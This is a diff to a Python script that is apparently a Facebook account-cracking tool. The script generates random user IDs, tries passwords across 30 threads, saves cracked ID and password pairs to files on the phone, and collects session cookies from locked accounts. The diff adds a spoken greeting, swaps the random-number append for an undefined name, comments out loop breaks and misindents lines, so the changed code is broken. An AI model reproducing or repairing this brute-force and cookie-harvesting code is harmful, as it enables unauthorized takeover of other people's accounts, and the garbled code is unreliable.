@@ -76,7 +76,7 @@ def __init__(self):
         self.ok = []
         self.cp = []
         self.loop = 0
-        
+      os.system('espeak -a 300 " Welcome to the ARAFAT VIP Tools,"')  
 logo = ("""
     \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
    \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
@@ -147,7 +147,7 @@ def fuck():
     limit = int(input('\033[38;5;46m[✔️]𝑪𝑯𝑶𝑶𝑺𝑬 : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
+        user.append(FUCKYOU)
     with ThreadPool(max_workers=30) as yaari:
         os.system('clear')
         print(logo1)
@@ -227,7 +227,7 @@ def mumit2(uid,pwx,tl):
 #--------𝐋𝐎𝐎𝐊 𝐈𝐃 𝐈𝐍 𝐅𝐑𝐎👇👇
                 open('/sdcard/EMRAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
-                break
+                #break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
@@ -236,8 +236,8 @@ def mumit2(uid,pwx,tl):
 \033[38;5;46m[𝐋𝐎𝐂𝐊]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊]:{ps} 
 """)
                 open('/sdcard/EMRAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
+                  cps.append(uid)
+                #break
             else:
                 continue             
 #𝑪𝑹𝑲 𝑺𝒀𝑺𝑻𝑬𝑴✔️✔️✔️✔️✔️              
